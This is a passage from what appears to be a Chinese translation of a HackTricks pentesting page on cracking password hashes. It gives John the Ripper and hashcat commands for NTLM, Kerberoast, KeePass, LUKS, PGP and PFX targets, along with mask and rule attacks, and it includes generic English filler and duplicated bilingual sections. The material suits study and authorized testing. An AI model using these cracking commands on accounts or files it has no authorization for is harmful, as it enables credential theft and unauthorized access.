python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM破解

NTLM（NT LAN Manager）是一种用于Windows操作系统的身份验证协议。它使用哈希函数对用户的密码进行加密，并将其存储在本地系统中。然而，由于NTLM的哈希算法相对较弱，因此可以使用暴力破解技术来破解NTLM密码。

暴力破解是一种通过尝试所有可能的密码组合来破解密码的方法。对于NTLM密码破解，可以使用字典攻击或者使用暴力破解工具来尝试所有可能的密码。

字典攻击是一种使用预先准备好的密码列表来尝试破解密码的方法。攻击者可以使用常见密码列表、泄露的密码列表或者自定义密码列表来进行字典攻击。如果目标用户的密码在字典中存在，那么攻击者就可以成功破解密码。

另一种方法是使用暴力破解工具，如John the Ripper或Hashcat。这些工具使用计算机的处理能力来尝试所有可能的密码组合，直到找到正确的密码为止。这种方法通常需要大量的时间和计算资源，但在某些情况下可能是成功破解NTLM密码的唯一方法。

为了提高NTLM密码的安全性，可以采取以下措施：

- 使用强密码：选择复杂、随机的密码，包括字母、数字和特殊字符。
- 使用多因素身份验证：通过使用额外的身份验证因素，如手机验证码或指纹识别，增加账户的安全性。
- 定期更改密码：定期更改密码可以减少密码被破解的风险。
- 使用密码管理器：使用密码管理器可以帮助生成和存储强密码，避免使用相同的密码。

总之，NTLM密码破解是一种通过暴力破解技术尝试所有可能的密码组合来破解Windows系统中的NTLM密码的方法。为了保护账户的安全，用户应该采取一些措施来选择强密码并增加账户的安全性。
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

Keepass是一种密码管理工具，它可以帮助您创建和存储强密码，并将其加密保存在一个安全的数据库中。它使用一个主密码来保护您的密码数据库，只有在输入正确的主密码后，才能访问和查看存储的密码。

尽管Keepass是一个安全的工具，但它仍然可能受到暴力破解攻击的威胁。暴力破解是一种尝试所有可能的密码组合来破解密码的攻击方法。攻击者可以使用自动化工具来尝试大量的密码组合，直到找到正确的密码。

为了防止暴力破解攻击，您可以采取一些措施来增加密码的复杂性和安全性。首先，选择一个强大的主密码，包括字母、数字和特殊字符，并避免使用常见的单词或短语。其次，启用Keepass的自动锁定功能，以便在一段时间没有活动时自动锁定数据库。此外，您还可以使用Keepass的密码生成器来生成随机的、强大的密码。

如果您怀疑自己的Keepass数据库可能已经遭到暴力破解攻击，您应该立即采取行动。首先，更改主密码，并确保新密码足够强大。其次，检查数据库中的密码是否被更改或泄露。如果发现任何异常活动，立即采取措施保护您的账户和数据。

总之，Keepass是一个强大的密码管理工具，但仍然需要采取预防措施来保护您的密码数据库免受暴力破解攻击。通过选择强大的主密码、启用自动锁定功能和定期检查异常活动，您可以增加您的密码安全性。
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting是一种攻击技术，用于获取Active Directory（AD）环境中的弱密码。该技术利用了AD中的Kerberos身份验证协议的漏洞。Keberoasting攻击的目标是那些使用服务主体名称（Service Principal Name，SPN）的服务账户。

攻击者首先通过扫描AD环境来识别使用SPN的服务账户。然后，攻击者使用工具（如Rubeus）来请求这些服务账户的服务票据（Service Ticket）。服务票据是由Kerberos颁发的，用于验证服务账户的身份。

一旦攻击者获取了服务票据，他们可以将其导出到离线环境中进行离线攻击。攻击者可以使用工具（如Hashcat）来破解服务票据中的密码散列值，从而获取服务账户的明文密码。

为了防止Keberoasting攻击，组织可以采取以下措施：

- 定期审查和删除不再需要的服务账户。
- 为服务账户设置强密码策略。
- 使用工具（如BloodHound）来识别和修复AD中的权限问题，以减少攻击者能够访问的服务账户数量。

Keberoasting是一种有效的攻击技术，因此组织应该采取适当的措施来保护其AD环境中的服务账户。
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### LUKS 图像

#### 方法 1

安装：[https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### 方法2

Brute force is a common method used in hacking to gain unauthorized access to a system or account. It involves systematically trying all possible combinations of passwords until the correct one is found.

Brute force attacks can be time-consuming and resource-intensive, especially if the password is long and complex. However, they can be effective against weak passwords or poorly implemented security measures.

To perform a brute force attack, hackers use automated tools that generate and test password combinations at a high speed. These tools can be customized to target specific systems or accounts.

There are several techniques and resources available to hackers for conducting brute force attacks. Some common methods include:

1. **Dictionary Attack**: This method involves using a pre-defined list of commonly used passwords or words from a dictionary to guess the password. The tool systematically tries each word until the correct one is found.

2. **Hybrid Attack**: In this method, hackers combine dictionary words with numbers, symbols, or variations in capitalization to create password combinations. This increases the chances of success by including more possible variations.

3. **Mask Attack**: A mask attack involves creating a password pattern based on known information about the target, such as the length or specific characters. The tool then generates password combinations that match the pattern.

4. **Brute Force with Rainbow Tables**: Rainbow tables are precomputed tables of password hashes and their corresponding plaintext passwords. By comparing the target's password hash with the entries in the rainbow table, hackers can quickly find the corresponding plaintext password.

5. **Credential Stuffing**: This technique involves using a list of stolen usernames and passwords from one website to gain unauthorized access to accounts on another website. Many users reuse passwords across multiple platforms, making this method effective.

It is important to note that brute force attacks are illegal and unethical unless conducted with proper authorization for legitimate purposes, such as penetration testing. Protecting against brute force attacks involves implementing strong password policies, using multi-factor authentication, and monitoring for suspicious login attempts.
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
另一个Luks BF教程：[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG私钥

Brute forcing a PGP/GPG private key involves systematically trying all possible combinations of characters until the correct key is found. This method is time-consuming and resource-intensive, but it can be effective if the key is weak or poorly chosen.

To perform a brute force attack on a PGP/GPG private key, you can use specialized software or scripts that automate the process. These tools generate and test different combinations of characters, starting from the simplest and most common ones, such as dictionary words or common passwords, and gradually moving towards more complex combinations.

It is important to note that the success of a brute force attack depends on several factors, including the length and complexity of the key, the computing power available, and the time and resources allocated to the attack. Strong and well-chosen keys with sufficient length can significantly increase the time and effort required to crack them.

To protect against brute force attacks on PGP/GPG private keys, it is recommended to use strong and unique passphrases that are not easily guessable. Additionally, regularly updating and changing the passphrase can further enhance the security of the private key.

Remember that brute forcing someone else's private key without their consent is illegal and unethical. Brute force attacks should only be performed on systems and assets that you have explicit permission to test or assess for security vulnerabilities.
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI主密钥

使用[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py)然后运行john

### Open Office密码保护的列

如果你有一个xlsx文件，其中有一列被密码保护，你可以取消保护：

* **将其上传到Google Drive**，密码将自动删除
* **手动删除**它：
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX证书

PFX certificates, also known as PKCS#12 certificates, are a type of digital certificate that is used for secure communication and authentication. PFX certificates are commonly used in various applications, such as web servers, email clients, and VPNs.

PFX certificates are stored in a single file that contains both the public key and the corresponding private key. This file is typically password-protected to ensure the security of the private key.

To use a PFX certificate, you need to import it into the application or system that requires it. This can usually be done through the application's settings or configuration options.

Brute-forcing a PFX certificate involves attempting to guess the password used to protect the private key. This is typically done by trying a large number of possible passwords until the correct one is found.

There are various tools and techniques available for brute-forcing PFX certificates, including using wordlists, dictionary attacks, and custom scripts. It is important to note that brute-forcing a PFX certificate is a time-consuming process and may not always be successful.

It is also worth mentioning that brute-forcing a PFX certificate without proper authorization is illegal and unethical. It should only be done as part of a legitimate penetration testing or security assessment, with the proper authorization and consent.
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 工具

**哈希示例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### 哈希标识符
```bash
hash-identifier
> <HASH>
```
### 字典列表

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **字典生成工具**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**：**高级键盘漫游生成器，可配置基本字符、键盘映射和路径。
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John变异

阅读 _**/etc/john/john.conf**_ 并进行配置
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat攻击

* **字典攻击** (`-a 0`) 使用规则

**Hashcat**已经带有一个包含规则的**文件夹**，但你可以在[**这里找到其他有趣的规则**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **字典组合**攻击

可以使用hashcat将两个字典组合成一个。\
如果列表1包含单词**"hello"**，而第二个列表包含两行单词**"world"**和**"earth"**。将生成单词`helloworld`和`helloearth`。
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **掩码攻击** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* 字典 + 掩码 (`-a 6`) / 掩码 + 字典 (`-a 7`) 攻击
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat模式

Hashcat是一款强大的密码破解工具，支持多种破解模式。以下是一些常用的Hashcat模式：

- **Straight**: 直接破解模式，适用于已知密码哈希值的情况。
- **Combination**: 组合破解模式，适用于已知密码部分字符的情况。
- **Brute-force**: 暴力破解模式，适用于未知密码的情况。
- **Hybrid**: 混合破解模式，结合了字典和暴力破解，适用于复杂密码的情况。
- **Mask**: 掩码破解模式，通过指定密码的部分字符和字符集合来破解密码。
- **Rule-based**: 基于规则的破解模式，通过应用密码变换规则来破解密码。

使用Hashcat时，选择适合的破解模式可以提高破解效率。根据不同的情况，选择合适的模式进行密码破解。
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
# 破解Linux哈希 - /etc/shadow文件

在Linux系统中，用户的密码哈希值存储在`/etc/shadow`文件中。这些哈希值是通过加密算法对用户密码进行散列处理而生成的。破解这些哈希值可以帮助我们获取用户的明文密码。

## 暴力破解

暴力破解是一种常见的破解哈希值的方法。它通过尝试所有可能的密码组合来破解哈希值。以下是暴力破解的一般步骤：

1. 获取`/etc/shadow`文件：首先，我们需要获取目标系统的`/etc/shadow`文件。这可以通过访问目标系统的文件系统或通过远程访问获取。

2. 提取哈希值：从`/etc/shadow`文件中提取目标用户的哈希值。哈希值通常以用户名和哈希算法标识符的形式存储。

3. 构建密码字典：创建一个密码字典，其中包含可能的密码组合。密码字典可以包含常见密码、字典单词、日期、用户名等。

4. 进行暴力破解：使用密码字典中的每个密码尝试生成哈希值，并将其与目标哈希值进行比较。如果匹配成功，则找到了目标用户的密码。

## 使用工具

为了简化暴力破解过程，我们可以使用各种密码破解工具。这些工具可以自动化密码字典的生成和哈希值的比较。以下是一些常用的密码破解工具：

- John the Ripper：一款功能强大的密码破解工具，支持多种哈希算法。
- Hashcat：一个高度优化的密码破解工具，支持多种哈希算法和并行计算。
- Hydra：一个网络登录破解工具，可以用于暴力破解SSH、FTP、SMTP等服务的密码。

## 防御措施

为了防止哈希值被暴力破解，我们可以采取以下措施：

- 使用强密码：选择足够复杂和长的密码，包括字母、数字和特殊字符的组合。
- 使用盐值：将随机生成的盐值与密码一起存储，增加破解的难度。
- 使用适当的哈希算法：选择安全性较高的哈希算法，如SHA-512。
- 实施账户锁定：在多次登录失败后，暂时锁定用户账户，以防止暴力破解攻击。

通过了解暴力破解的原理和防御措施，我们可以更好地保护系统中的密码哈希值。
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# 破解Windows哈希值

## Brute Force Attacks

## 暴力破解攻击

Brute force attacks are a common method used to crack Windows hashes. This technique involves systematically trying every possible combination of characters until the correct password is found.

暴力破解攻击是一种常用的破解Windows哈希值的方法。该技术涉及系统地尝试每个可能的字符组合，直到找到正确的密码为止。

### Dictionary Attacks

### 字典攻击

A dictionary attack is a type of brute force attack that uses a predefined list of words or phrases, known as a dictionary, to guess the password. This method is effective when the password is a common word or phrase that can be found in the dictionary.

字典攻击是一种使用预定义的单词或短语列表（称为字典）来猜测密码的暴力破解攻击类型。当密码是一个常见的单词或短语，可以在字典中找到时，这种方法是有效的。

### Hybrid Attacks

### 混合攻击

A hybrid attack combines elements of both brute force and dictionary attacks. It involves using a combination of characters from a predefined character set and words from a dictionary to guess the password. This method is effective against passwords that are not easily guessable but still contain common words or phrases.

混合攻击结合了暴力破解攻击和字典攻击的元素。它涉及使用预定义字符集中的字符组合和字典中的单词来猜测密码。这种方法对于不容易猜测但仍包含常见单词或短语的密码是有效的。

### Rainbow Tables

### 彩虹表

Rainbow tables are precomputed tables of hash values and their corresponding plaintext passwords. These tables can be used to quickly look up the plaintext password for a given hash value, bypassing the need for brute force or dictionary attacks. However, rainbow tables can be large and require significant storage space.

彩虹表是预先计算的哈希值及其对应的明文密码的表格。这些表格可以用于快速查找给定哈希值的明文密码，而无需进行暴力破解或字典攻击。然而，彩虹表可能很大，并且需要大量的存储空间。

### Password Cracking Tools

### 密码破解工具

There are several password cracking tools available that can automate the process of cracking Windows hashes. These tools often support various attack methods, including brute force, dictionary, and hybrid attacks. Some popular password cracking tools include John the Ripper, Hashcat, and Cain and Abel.

有几种可用的密码破解工具可以自动化破解Windows哈希值的过程。这些工具通常支持各种攻击方法，包括暴力破解、字典攻击和混合攻击。一些流行的密码破解工具包括John the Ripper、Hashcat和Cain and Abel。
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
# Brute Force

Brute force is a common method used to crack application hashes. It involves systematically trying every possible combination of characters until the correct password is found.

## Dictionary Attack

A dictionary attack is a type of brute force attack that uses a pre-defined list of commonly used passwords, known as a dictionary, to crack hashes. This method is effective against weak passwords that are easily guessable.

## Hybrid Attack

A hybrid attack combines elements of both brute force and dictionary attacks. It involves trying all possible combinations of characters, including variations of dictionary words, to crack hashes. This method is effective against stronger passwords that are not easily guessable.

## Rainbow Tables

Rainbow tables are precomputed tables of hash values and their corresponding plaintext passwords. These tables can be used to quickly look up the plaintext password for a given hash, bypassing the need for brute force or dictionary attacks. However, rainbow tables can be large and require significant storage space.

## Password Cracking Tools

There are several password cracking tools available that automate the process of brute forcing application hashes. These tools often support multiple attack methods, including brute force, dictionary, and hybrid attacks. Some popular password cracking tools include John the Ripper, Hashcat, and Hydra.

## Best Practices for Password Security

To protect against brute force attacks, it is important to use strong, unique passwords that are not easily guessable. Additionally, implementing measures such as account lockouts and rate limiting can help prevent brute force attacks. Regularly updating passwords and using multi-factor authentication are also recommended for enhanced security.

## Conclusion

Brute force attacks can be a powerful method for cracking application hashes, but they require time and computational resources. By implementing strong password security practices and staying vigilant against potential attacks, users can greatly reduce the risk of their hashes being cracked.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass) 或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
